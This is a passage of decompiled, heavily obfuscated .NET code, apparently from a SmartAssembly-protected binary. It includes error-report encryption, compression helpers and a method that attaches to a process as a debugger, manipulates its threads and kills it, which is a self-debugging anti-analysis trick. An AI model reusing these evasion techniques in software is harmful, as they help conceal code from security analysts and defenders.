      string str3;
      object[] objArray = new object[20]
      {
        (object) buffer,
        (object) cryptoStream,
        (object) count,
        (object) decryptor,
        (object) str2,
        (object) bytes3,
        (object) bytes2,
        (object) num1,
        (object) memoryStream,
        (object) s2,
        (object) password,
        (object) s1,
        (object) rfc2898DeriveBytes,
        (object) iterations,
        (object) str1,
        (object) numArray,
        (object) bytes1,
        (object) str3,
        (object) rijndaelManaged,
        (object) obj0
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Assembly \u0023Gj()
  {
    try
    {
      return Assembly.GetExecutingAssembly();
    }
    catch
    {
      return (Assembly) null;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Hj([In] uint obj0, [In] int obj1, [In] \u0023Z.\u00234 obj2)
  {
    \u0023Z.\u0023Ob ob;
    \u0023Z.\u0023Pb pb;
    \u0023Z.\u0023Qb qb;
    \u0023Z.\u0023Rb rb;
    \u0023Z.\u0023Fb fb;
    \u0023Z.\u0023Nb nb;
    uint num1;
    bool flag1;
    \u0023Z.\u0023lb lpDebugEvent;
    \u0023Z.\u0023yb yb;
    Exception exception1;
    uint SuspendCount;
    string str1;
    bool flag2;
    \u0023N n;
    string str2;
    Exception exception2;
    try
    {
      ob = \u0023J.\u0023Q<\u0023Z.\u0023Ob>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("IZRPfMpaEgyR6ZDyXnOYiJx08Wzx4ZAZWC/PdMnfamo="));
      pb = \u0023J.\u0023Q<\u0023Z.\u0023Pb>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("8E4kyZwlQ3AJzMDUyZVD4tOSfAQxWsmg1leG/X3uOQo="));
      qb = \u0023J.\u0023Q<\u0023Z.\u0023Qb>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("zyY3vUJrmonBTUubJ9UCC5TzDHj71hXOJ3SGrrAKtvU="));
      rb = \u0023J.\u0023Q<\u0023Z.\u0023Rb>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("WNauUailUhceWvNacXsoZYxTSn28xUnXdaZLyAiTtuU="));
      fb = \u0023J.\u0023Q<\u0023Z.\u0023Fb>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("w0qEzcCa4McG97qE1cgACdQlprmDa117VKUX1amgZAo="));
      nb = \u0023J.\u0023Q<\u0023Z.\u0023Nb>(\u0023\u0023.\u0023Fj("pdd3zZ5lwXtj8hV1GKRfVw=="), \u0023\u0023.\u0023Fj("qt4tHmTORXFlu08c+szp/A=="));
      if (!ob(checked ((int) obj2.\u00232)))
        throw new Exception();
      int num2 = qb(false) ? 1 : 0;
      num1 = 64U;
      flag1 = true;
      while (flag1)
      {
        lpDebugEvent = new \u0023Z.\u0023lb();
        if (!pb(out lpDebugEvent, -1))
          throw new Exception();
        switch (lpDebugEvent.\u0023fb)
        {
          case \u0023Z.\u0023vb.\u0023ob:
            yb = lpDebugEvent.\u0023jb();
            if (yb.\u0023wb.\u0023zb == 2147483649U)
            {
              int num3 = rb(lpDebugEvent.\u0023gb, lpDebugEvent.\u0023hb, 65538) ? 1 : 0;
              if (fb(obj2.\u00230, obj0, obj1, 320U, ref num1))
                continue;
              continue;
            }
            Thread.Sleep(400);
            int num4 = rb(lpDebugEvent.\u0023gb, lpDebugEvent.\u0023hb, 65538) ? 1 : 0;
            break;
          case \u0023Z.\u0023vb.\u0023mb:
            try
            {
              int num5 = fb(obj2.\u00230, obj0, obj1, 320U, ref num1) ? 1 : 0;
              int num6 = 2;
              if (\u0023\u0023.UBSgn55zIxbZDXest3e())
                goto label_12;
label_11:
              Thread.Sleep(400);
              goto label_14;
label_12:
              while (true)
              {
                switch (num6)
                {
                  case 0:
                  case 2:
                    goto label_11;
                  case 1:
                  case 3:
                    goto label_14;
                  default:
                    num6 = 3;
                    continue;
                }
              }
label_14:
              int num7 = fb(obj2.\u00230, obj0, obj1, 320U, ref num1) ? 1 : 0;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              exception1 = ex;
              Thread.Sleep(400);
              int num8 = fb(obj2.\u00230, obj0, obj1, 320U, ref num1) ? 1 : 0;
              int num9 = fb(obj2.\u00230, obj0, obj1, 320U, ref num1) ? 1 : 0;
              ProjectData.ClearProjectError();
            }
            SuspendCount = 0U;
            Thread.Sleep(400);
            if (nb(obj2.\u00231, out SuspendCount) == -1)
              throw new Exception("gds");
            int num10 = rb(lpDebugEvent.\u0023gb, lpDebugEvent.\u0023hb, 65538) ? 1 : 0;
            break;
          case \u0023Z.\u0023vb.\u0023pb:
            flag1 = false;
            int num11 = rb(lpDebugEvent.\u0023gb, lpDebugEvent.\u0023hb, 1073807364) ? 1 : 0;
            break;
          default:
            int num12 = rb(lpDebugEvent.\u0023gb, lpDebugEvent.\u0023hb, 65538) ? 1 : 0;
            break;
        }
        GC.Collect();
      }
      try
      {
        str1 = "fsdfsd";
        \u0023\u0023.\u00233i(15L, ref str1);
        int num13 = 2;
        if (true)
          goto label_25;
label_23:
        Process.GetProcessById(checked ((int) obj2.\u00232)).Kill();
        flag2 = true;
        \u0023\u0023.\u0023Tj(15324234L, 21452142152132L, ref flag2);
        num13 = 4;
label_25:
        while (true)
        {
          switch (num13)
          {
            case 0:
            case 2:
              goto label_24;
            case 1:
            case 3:
              goto label_23;
            case 4:
              goto label_27;
            default:
              if (true)
              {
                num13 = 3;
                continue;
              }
              goto label_27;
          }
        }
label_24:
        ref \u0023N local1 = ref n;
        str1 = "fsdfsdgsdgsdgsd";
        ref string local2 = ref str1;
        str2 = "GSDGSDGSDGSD";
        ref string local3 = ref str2;
        \u0023\u0023.\u0023wl(ref local1, ref local2, ref local3);
        goto label_23;
label_27:
        Process.GetCurrentProcess().Kill();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        exception2 = ex;
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      \u0023Z.\u0023vb vb;
      object[] objArray = new object[21]
      {
        (object) rb,
        (object) ob,
        (object) qb,
        (object) num1,
        (object) nb,
        (object) flag1,
        (object) fb,
        (object) pb,
        (object) lpDebugEvent,
        (object) SuspendCount,
        (object) exception1,
        (object) n,
        (object) exception2,
        (object) vb,
        (object) yb,
        (object) str1,
        (object) str2,
        (object) flag2,
        (object) obj2,
        (object) obj0,
        (object) obj1
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Ij([In] \u00238e obj0) => obj0.\u00237e;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static byte[] \u0023Jj([In] byte[] obj0, [In] string obj1)
  {
    int num1 = 4;
    if (\u0023\u0023.XPxp2PwLL1BPJh1nWga())
      ;
    RSACryptoServiceProvider cryptoServiceProvider;
    MemoryStream memoryStream;
    CryptoStream cryptoStream;
    RijndaelManaged rijndaelManaged;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 4:
          if (!obj1.StartsWith("{"))
          {
            rijndaelManaged = (RijndaelManaged) null;
            goto case 3;
          }
          else
          {
            num1 = 1;
            continue;
          }
        case 1:
          \u0023ce.\u0023pc = "ERR 2006: This template was not properly processed by SmartAssembly";
          if (\u0023\u0023.UBSgn55zIxbZDXest3e())
          {
            num1 = 5;
            continue;
          }
          goto case 0;
        case 2:
        case 5:
          goto label_2;
        case 3:
          cryptoServiceProvider = (RSACryptoServiceProvider) null;
          memoryStream = (MemoryStream) null;
          cryptoStream = (CryptoStream) null;
          if (true)
          {
            num1 = 6;
            continue;
          }
          goto label_2;
        case 6:
          goto label_9;
        default:
          num1 = 3;
          continue;
      }
    }
label_2:
    return (byte[]) null;
label_9:
    try
    {
      rijndaelManaged = new RijndaelManaged();
      cryptoServiceProvider = new RSACryptoServiceProvider();
      cryptoServiceProvider.FromXmlString(obj1);
      rijndaelManaged.GenerateKey();
      rijndaelManaged.GenerateIV();
      byte[] numArray1 = new byte[48];
      Buffer.BlockCopy((Array) rijndaelManaged.Key, 0, (Array) numArray1, 0, 32);
      Buffer.BlockCopy((Array) rijndaelManaged.IV, 0, (Array) numArray1, 32, 16);
      memoryStream = new MemoryStream();
      try
      {
        byte[] buffer = cryptoServiceProvider.Encrypt(numArray1, false);
        memoryStream.WriteByte((byte) 1);
        memoryStream.WriteByte(Convert.ToByte(buffer.Length / 8));
        memoryStream.Write(buffer, 0, buffer.Length);
      }
      catch (CryptographicException ex1)
      {
        try
        {
          byte[] numArray2 = new byte[16];
          int num2 = 5;
          byte[] buffer1;
          while (true)
          {
            int num3 = num2;
            byte[] buffer2;
            byte[] buffer3;
            byte[] numArray3;
            while (true)
            {
              switch (num3)
              {
                case 0:
                case 5:
                  goto label_19;
                case 1:
                case 3:
                  buffer2 = cryptoServiceProvider.Encrypt(numArray3, false);
                  buffer1 = cryptoServiceProvider.Encrypt(rijndaelManaged.IV, false);
                  memoryStream.WriteByte((byte) 2);
                  memoryStream.WriteByte(Convert.ToByte(buffer3.Length / 8));
                  goto case 4;
                case 2:
                  goto label_13;
                case 4:
                  memoryStream.Write(buffer3, 0, buffer3.Length);
                  if (true)
                  {
                    num3 = 2;
                    continue;
                  }
                  goto case 1;
                case 6:
                  goto label_20;
                default:
                  goto label_18;
              }
            }
label_13:
            memoryStream.Write(buffer2, 0, buffer2.Length);
            num2 = 6;
            continue;
label_18:
            num2 = 4;
            continue;
label_19:
            numArray3 = new byte[16];
            Buffer.BlockCopy((Array) rijndaelManaged.Key, 0, (Array) numArray2, 0, 16);
            Buffer.BlockCopy((Array) rijndaelManaged.Key, 16, (Array) numArray3, 0, 16);
            buffer3 = cryptoServiceProvider.Encrypt(numArray2, false);
            num2 = 3;
          }
label_20:
          memoryStream.Write(buffer1, 0, buffer1.Length);
        }
        catch (CryptographicException ex2)
        {
          \u0023ce.\u0023pc = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
          return (byte[]) null;
        }
      }
      cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(obj0, 0, obj0.Length);
      cryptoStream.FlushFinalBlock();
      return memoryStream.ToArray();
    }
    catch (Exception ex)
    {
      \u0023ce.\u0023pc = "ERR 2004: " + ex.Message;
      return (byte[]) null;
    }
    finally
    {
      rijndaelManaged?.Clear();
      cryptoServiceProvider?.Clear();
      memoryStream?.Close();
      cryptoStream?.Close();
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Kj([In] \u0023Te obj0)
  {
    try
    {
      string tempFileName = Path.GetTempFileName();
      \u0023\u0023.\u0023ql(obj0, tempFileName);
      Process.Start(Path.Combine(\u0023\u0023.\u00231i(), "SmartAssembly.exe"), "/AddExceptionReport \"" + tempFileName + "\"");
      if (obj0.\u0023Je == null)
        return;
      obj0.\u0023Je((object) obj0, EventArgs.Empty);
    }
    catch (ThreadAbortException ex)
    {
    }
    catch (Exception ex)
    {
      \u0023\u0023.\u0023zj(new \u00239e(ex), obj0);
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Lj([In] string obj0, [In] \u0023Uf obj1)
  {
    int num1 = 5;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_1;
          case 1:
            goto label_9;
          case 2:
            obj1.\u0023Kf = true;
            obj1.\u0023If = true;
            if (obj0.Length <= 0)
              break;
            goto case 3;
          case 3:
          case 4:
            obj1.Height = 100;
            break;
          case 6:
            goto label_3;
          default:
            num2 = 4;
            continue;
        }
        obj1.Refresh();
        if (true)
          num2 = 6;
        else
          goto label_9;
      }
label_1:
      obj1.\u0023Lf = obj0;
      num1 = 1;
      continue;
label_9:
      obj1.\u0023Jf.Enabled = false;
      obj1.\u0023Hf = (Image) \u0023\u0023.\u00235i(obj0.Length > 0 ? "error" : "ok");
      num1 = 2;
    }
label_3:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Mj(
    [In] string obj0,
    [In] string obj1,
    [In] \u0023Af obj2,
    [In] \u0023wg obj3,
    [In] string obj4,
    [In] byte[] obj5)
  {
    try
    {
      ReportingService reportingService = new ReportingService(obj3.\u0023ug);
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            if (obj3.\u0023vg == null)
              goto label_5;
            else
              goto case 1;
          case 1:
          case 3:
            reportingService.Proxy = obj3.\u0023vg;
            num = 4;
            continue;
          case 4:
            goto label_5;
          default:
            num = 3;
            continue;
        }
      }
label_5:
      obj2(reportingService.UploadReport2(obj3.\u0023tg, obj5, obj4, obj1, obj0));
    }
    catch (Exception ex)
    {
      obj2("ERR 2002: " + ex.Message);
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Nj([In] \u0023qc.\u0023bd obj0)
  {
    try
    {
      obj0.\u00237c |= 12;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023bd bd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) bd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Oj([In] Exception obj0, [In] object obj1) => \u0023\u0023.\u0023ji(obj0, new object[1]
  {
    obj1
  });

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023Pj([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Qj([In] \u0023qc.\u0023Pd obj0)
  {
    int num1;
    int num2;
    try
    {
      int num3;
      if (obj0.\u0023Od > 0)
        num3 = 4;
      else
        goto label_7;
label_3:
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 4:
            byte[] kd1 = obj0.\u0023Kd;
            num1 = obj0.\u0023Md++;
            int index1 = num1;
            int nd = (int) (byte) obj0.\u0023Nd;
            kd1[index1] = (byte) nd;
            if (true)
            {
              num3 = 3;
              continue;
            }
            goto label_6;
          case 1:
          case 3:
            goto label_2;
          case 2:
            goto label_6;
          case 5:
            goto label_8;
          default:
            if (true)
            {
              num3 = 2;
              continue;
            }
            goto case 0;
        }
      }
label_2:
      if (obj0.\u0023Od <= 8)
        goto label_7;
label_6:
      byte[] kd2 = obj0.\u0023Kd;
      num2 = obj0.\u0023Md++;
      int index2 = num2;
      int num4 = (int) (byte) (obj0.\u0023Nd >> 8);
      kd2[index2] = (byte) num4;
      goto label_7;
label_8:
      obj0.\u0023Od = 0;
      return;
label_7:
      obj0.\u0023Nd = 0U;
      num3 = 5;
      goto label_3;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      \u0023qc.\u0023Pd pd = obj0;
      \u0023\u0023.\u0023Dj(ex, (object) local1, (object) local2, (object) pd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Rj([In] \u0023qc.\u0023bd obj0)
  {
    bool flag;
    try
    {
      if (obj0.\u00237c == 30)
      {
        int num = 2;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              goto label_2;
            case 1:
            case 3:
              goto label_7;
            default:
              num = 3;
              continue;
          }
        }
label_2:
        flag = \u0023\u0023.\u0023vk(obj0.\u00239c);
      }
      else
        flag = false;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023bd bd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) bd);
      throw;
    }
label_7:
    return flag;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static object \u0023Sj([In] \u00238e obj0) => obj0.\u00236e;

  [DllImport("gdi32.dll", EntryPoint = "GetObjectA", CharSet = CharSet.Ansi, SetLastError = true)]
  internal static extern long \u0023Tj([In] long obj0, [In] long obj1, [In] ref bool obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023Uj([In] \u0023qc.\u0023Qd obj0)
  {
    try
    {
      return \u0023\u0023.\u00233h(obj0) | \u0023\u0023.\u00233h(obj0) << 16;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Qd qd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) qd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023Vj([In] \u0023qc.\u0023Pd obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
  {
    int num1;
    try
    {
      int num2;
      if (obj0.\u0023Od >= 8)
      {
        num2 = 5;
        goto label_5;
      }
label_3:
      if (obj3 <= obj0.\u0023Md - obj0.\u0023Ld)
      {
        Array.Copy((Array) obj0.\u0023Kd, obj0.\u0023Ld, (Array) obj1, obj2, obj3);
        obj0.\u0023Ld += obj3;
        num2 = 6;
        goto label_5;
      }
      else
        goto label_10;
label_4:
      int num3;
      num2 = num3;
label_5:
      switch (num2)
      {
        case 0:
          Array.Copy((Array) obj0.\u0023Kd, obj0.\u0023Ld, (Array) obj1, obj2, obj3);
          obj0.\u0023Ld = 0;
          obj0.\u0023Md = 0;
          goto case 6;
        case 1:
        case 4:
          obj0.\u0023Od -= 8;
          goto label_3;
        case 2:
        case 3:
          break;
        case 5:
          byte[] kd = obj0.\u0023Kd;
          num1 = obj0.\u0023Md++;
          int index = num1;
          int nd = (int) (byte) obj0.\u0023Nd;
          kd[index] = (byte) nd;
          obj0.\u0023Nd >>= 8;
          num3 = 4;
          goto label_4;
        case 6:
          return obj3;
        default:
          num3 = 3;
          goto label_4;
      }
label_10:
      obj3 = obj0.\u0023Md - obj0.\u0023Ld;
      num3 = 0;
      goto label_4;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      \u0023qc.\u0023Pd pd = obj0;
      byte[] numArray = obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) obj2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) obj3;
      \u0023\u0023.\u0023mk(ex, (object) local1, (object) pd, (object) numArray, (object) local2, (object) local3);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Icon \u0023Wj()
  {
    try
    {
      return \u0023\u0023.\u0023vi();
    }
    catch (Exception ex)
    {
      return \u0023\u0023.\u0023Dk("default");
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Xj([In] \u0023qc.\u0023Qd obj0, [In] int obj1)
  {
    try
    {
      \u0023\u0023.\u00237i(obj0, obj1);
      \u0023\u0023.\u00237i(obj0, obj1 >> 16);
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Qd qd = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) obj1;
      \u0023\u0023.\u0023Jk(ex, (object) qd, (object) local);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Yj([In] byte[] obj0, [In] \u0023qc.\u0023Sc obj1)
  {
    int[] numArray1;
    int num1;
    int num2;
    int[] numArray2;
    int index1;
    int num3;
    int num4;
    int num5;
    int length;
    int index2;
    int index3;
    int index4;
    int index5;
    int index6;
    int index7;
    int num6;
    int num7;
    int num8;
    int num9;
    try
    {
      numArray1 = new int[16];
      int num10 = 1;
      while (true)
      {
        int num11 = num10;
        while (true)
        {
          switch (num11)
          {
            case 0:
              num4 += numArray1[index1] << 16 - index1;
              if (index1 >= 10)
              {
                int num12 = 6;
                num11 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num12 : num12;
                continue;
              }
              goto case 10;
            case 1:
              numArray2 = new int[16];
              index7 = 0;
              goto label_16;
            case 2:
            case 12:
              ++numArray1[index6];
              break;
            case 3:
              length = 512;
              index1 = 1;
              goto label_19;
            case 4:
              goto label_1;
            case 5:
              length += num5 - num3 >> 16 - index1;
              num11 = 10;
              continue;
            case 6:
              num3 = numArray2[index1] & 130944;
              num5 = num4 & 130944;
              goto case 5;
            case 7:
            case 8:
label_8:
              if (index2 < 10)
              {
                index3 = 0;
                goto case 14;
              }
              else
              {
                num7 = num4 & 130944;
                num4 -= numArray1[index2] << 16 - index2;
                num8 = num4 & 130944;
                for (num9 = num8; num9 < num7; num9 += 128)
                {
                  obj1.\u0023Pc[(int) \u0023\u0023.\u00238h(num9)] = (short) (-num6 << 4 | index2);
                  num6 += 1 << index2 - 9;
                }
                --index2;
                int num13 = 7;
                num11 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num13 : num13;
                continue;
              }
            case 9:
              if (index6 <= 0)
                break;
              goto label_28;
            case 10:
              ++index1;
              goto label_19;
            case 11:
              do
              {
                obj1.\u0023Pc[num1 | index5 >> 9] = (short) (index3 << 4 | index4);
                index5 += 1 << index4;
              }
              while (index5 < num2);
              goto label_34;
            case 13:
              ++index3;
              if (\u0023\u0023.UBSgn55zIxbZDXest3e())
              {
                num11 = 14;
                continue;
              }
              goto case 0;
            case 14:
              if (index3 < obj0.Length)
              {
                index4 = (int) obj0[index3];
                if (index4 != 0)
                {
                  num4 = numArray2[index4];
                  index5 = (int) \u0023\u0023.\u00238h(num4);
                  if (index4 <= 9)
                  {
                    do
                    {
                      obj1.\u0023Pc[index5] = (short) (index3 << 4 | index4);
                      index5 += 1 << index4;
                    }
                    while (index5 < 512);
                    goto label_34;
                  }
                  else
                    goto label_13;
                }
                else
                  goto case 13;
              }
              else
                goto label_36;
            default:
              if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
              {
                num11 = 5;
                continue;
              }
              goto case 3;
          }
          ++index7;
label_16:
          if (index7 < obj0.Length)
          {
            index6 = (int) obj0[index7];
            num11 = 9;
            continue;
          }
          goto label_17;
label_19:
          if (index1 <= 15)
          {
            numArray2[index1] = num4;
            num11 = 0;
            continue;
          }
          obj1.\u0023Pc = new short[length];
          num6 = 512;
          index2 = 15;
          goto label_8;
label_34:
          numArray2[index4] = num4 + (1 << 16 - index4);
          num11 = 13;
        }
label_1:
        num2 = 1 << (num1 & 15);
        num1 = -(num1 >> 4);
        num10 = 11;
        continue;
label_13:
        num1 = (int) obj1.\u0023Pc[index5 & 511];
        num10 = 4;
        continue;
label_17:
        num4 = 0;
        num10 = 3;
        continue;
label_28:
        num10 = 12;
      }
label_36:;
    }
    catch (Exception ex)
    {
      object[] objArray = new object[21]
      {
        (object) numArray1,
        (object) numArray2,
        (object) index7,
        (object) index6,
        (object) num4,
        (object) length,
        (object) index1,
        (object) num3,
        (object) num5,
        (object) num6,
        (object) index2,
        (object) num7,
        (object) num8,
        (object) num9,
        (object) index3,
        (object) index4,
        (object) index5,
        (object) num1,
        (object) num2,
        (object) obj1,
        (object) obj0
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Zj([In] \u0023rg obj0, [In] \u0023of obj1)
  {
    int num1 = 4;
    while (true)
    {
      int num2 = num1;
      \u0023of comparand;
      \u0023of of1;
      \u0023of of2;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            of2 = obj0.\u0023fe;
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 1;
              continue;
            }
            goto label_8;
          case 1:
            goto label_8;
          case 2:
          case 5:
            of1 = comparand + obj1;
            goto case 3;
          case 3:
            of2 = Interlocked.CompareExchange<\u0023of>(ref obj0.\u0023fe, of1, comparand);
            if (of2 == comparand)
            {
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto case 0;
            }
            else
              goto label_8;
          case 6:
            goto label_10;
          default:
            goto label_4;
        }
      }
label_4:
      num1 = 3;
      continue;
label_8:
      comparand = of2;
      num1 = 5;
    }
label_10:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00230j([In] \u0023qc.\u0023Jd obj0, [In] byte[] obj1)
  {
    try
    {
      obj0.\u0023Ed = obj1;
      int num = 2;
      if (\u0023\u0023.XPxp2PwLL1BPJh1nWga())
        ;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            goto label_1;
          case 1:
          case 3:
            goto label_4;
          default:
            num = 3;
            continue;
        }
      }
label_1:
      obj0.\u0023Gd = 0;
label_4:
      obj0.\u0023Hd = obj1.Length;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Jd jd = obj0;
      byte[] numArray = obj1;
      \u0023\u0023.\u0023Jk(ex, (object) jd, (object) numArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00231j([In] \u00232f obj0, [In] \u0023Zf obj1)
  {
    int num1 = 0;
    while (true)
    {
      int num2;
      switch (num1)
      {
        case 0:
          if (obj0.\u0023Zf != obj1)
          {
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num1 = 5;
              continue;
            }
            goto case 2;
          }
          else
            goto label_9;
        case 1:
        case 5:
          obj0.\u0023Zf = obj1;
          num2 = 4;
          break;
        case 2:
        case 4:
          switch (obj0.\u0023Zf)
          {
            case \u0023Zf.\u0023We:
              obj0.\u0023Yf = \u0023\u0023.\u00235i("error16");
              goto label_13;
            case \u0023Zf.\u00234f:
              obj0.\u0023Yf = \u0023\u0023.\u00235i("warning16");
              goto label_13;
            default:
              goto label_12;
          }
        case 3:
label_12:
          obj0.\u0023Yf = (Bitmap) null;
          goto label_13;
        case 6:
          goto label_4;
        default:
          num1 = 3;
          continue;
      }
label_5:
      num1 = num2;
      continue;
label_13:
      obj0.Refresh();
      num2 = 6;
      goto label_5;
    }
label_9:
    return;
label_4:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00232j([In] \u0023rg obj0, [In] EventHandler obj1)
  {
    int num1 = 2;
    while (true)
    {
      int num2 = num1;
      EventHandler comparand;
      EventHandler eventHandler1;
      EventHandler eventHandler2;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_7;
          case 1:
          case 4:
            comparand = eventHandler2;
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 3;
              continue;
            }
            goto label_9;
          case 3:
            eventHandler1 = comparand + obj1;
            goto case 5;
          case 5:
            eventHandler2 = Interlocked.CompareExchange<EventHandler>(ref obj0.\u0023Je, eventHandler1, comparand);
            if (eventHandler2 != comparand)
              goto case 1;
            else
              goto label_6;
          case 6:
            goto label_10;
          default:
            goto label_4;
        }
      }
label_4:
      num1 = 5;
      continue;
label_6:
      num1 = 6;
      continue;
label_7:
      eventHandler2 = obj0.\u0023Je;
      num1 = 4;
    }
label_10:
    return;
label_9:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00233j([In] \u0023qc.\u0023md.\u0023Pc obj0, [In] \u0023qc.\u0023md.\u0023Pc obj1)
  {
    int index1;
    int index2;
    int num1;
    int index3;
    int num2;
    int num3;
    try
    {
      index1 = -1;
      index2 = 0;
      int num4 = 2;
      while (true)
      {
        int num5 = num4;
        while (true)
        {
          switch (num5)
          {
            case 0:
              num1 = 0;
              goto case 7;
            case 1:
              if (index1 == index3)
                goto case 7;
              else
                goto label_15;
            case 2:
            case 3:
            case 4:
            case 5:
            case 6:
            case 9:
              goto label_21;
            case 7:
            case 8:
              do
              {
                index1 = index3;
                ++index2;
                while (index2 < obj0.\u0023qd && index1 == (int) obj0.\u0023od[index2])
                {
                  ++index2;
                  if (++num1 >= num2)
                    break;
                }
                if (num1 >= num3)
                {
                  if (index1 == 0)
                  {
                    if (num1 <= 10)
                      ++obj1.\u0023nd[17];
                    else
                      goto label_20;
                  }
                  else
                    goto label_2;
                }
                else
                  goto label_9;
              }
              while (!\u0023\u0023.UBSgn55zIxbZDXest3e());
              goto label_19;
label_9:
              obj1.\u0023nd[index1] += (short) num1;
              if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
              {
                num5 = 3;
                continue;
              }
              goto case 0;
label_19:
              num5 = 4;
              continue;
label_20:
              ++obj1.\u0023nd[18];
              num5 = 9;
              continue;
            default:
              goto label_13;
          }
        }
label_2:
        ++obj1.\u0023nd[16];
        goto label_21;
label_13:
        num4 = 8;
        continue;
label_15:
        ++obj1.\u0023nd[index3];
        num4 = 0;
        continue;
label_21:
        if (index2 < obj0.\u0023qd)
        {
          num1 = 1;
          index3 = (int) obj0.\u0023od[index2];
          if (index3 != 0)
          {
            num2 = 6;
            num3 = 3;
            num4 = 1;
          }
          else
          {
            num2 = 138;
            num3 = 3;
            num4 = 7;
          }
        }
        else
          break;
      }
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) index1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) index2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local6 = (ValueType) index3;
      \u0023qc.\u0023md.\u0023Pc pc1 = obj0;
      \u0023qc.\u0023md.\u0023Pc pc2 = obj1;
